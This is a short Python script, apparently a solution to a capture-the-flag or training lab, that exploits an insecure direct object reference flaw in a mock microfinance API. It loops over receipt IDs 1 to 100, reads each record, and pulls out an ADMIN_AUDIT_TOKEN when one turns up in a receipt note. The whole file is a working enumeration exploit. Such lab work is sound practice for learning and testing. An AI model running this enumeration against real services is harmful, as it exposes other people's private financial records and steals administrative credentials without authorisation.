import json
import urllib.request
import urllib.error

SEED = "894973d1bb37394d4b1c288a7419d6c15802efc13c5dccb2058c8454ae24a5ed"
BASE_URL = f"https://hackforachangeruntime.vercel.app/api/microfinance-idor?seed={SEED}&action=receipt&id="


def fetch_receipt(receipt_id: int) -> dict | None:
    url = BASE_URL + str(receipt_id)
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return json.loads(resp.read())
    except (urllib.error.URLError, json.JSONDecodeError, OSError) as e:
        print(f"  [!] ID {receipt_id}: {e}")
        return None


def main():
    print("Enumerating receipts 1..100 for ADMIN_AUDIT_TOKEN...\n")

    for i in range(1, 101):
        data = fetch_receipt(i)
        if data is None:
            continue

        receipt = data.get("receipt", {})
        note = receipt.get("note", "")

        if "ADMIN_AUDIT_TOKEN" in note:
            print(f">>> FOUND at ID {i}")
            print(json.dumps(data, indent=2))
            print()
            # Extract the token
            token = note.split("ADMIN_AUDIT_TOKEN:")[-1].strip()
            print(f">>> Dispatch token: {token}")
            return

    print("No ADMIN_AUDIT_TOKEN found in receipts 1..100.")


if __name__ == "__main__":
    main()
